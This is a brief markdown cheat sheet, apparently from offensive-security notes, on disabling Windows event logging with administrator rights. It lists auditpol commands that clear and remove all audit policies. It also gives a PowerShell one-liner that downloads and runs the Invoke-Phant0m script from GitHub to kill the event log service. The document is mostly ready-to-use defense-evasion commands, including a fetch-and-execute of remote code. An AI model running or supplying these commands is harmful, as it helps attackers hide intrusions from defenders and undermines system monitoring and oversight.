# Disable Windows Event Logging

## Permissions: Administrator

### 1) Auditpol

##### Delete the per-user audit policy for all users, reset the system audit policy settings for all subcategories, and set all the audit policy settings to disabled,

    auditpol.exe /clear /y
    auditpol.exe  /remove /allusers

### 2) Invoke-Phant0m

##### Completely disables the event log service. Requires a system restart to return normal operation.

    iex (iwr -usebasicparsing https://raw.githubusercontent.com/olafhartong/Invoke-Phant0m/master/Invoke-Phant0m.ps1);Invoke-Phant0m
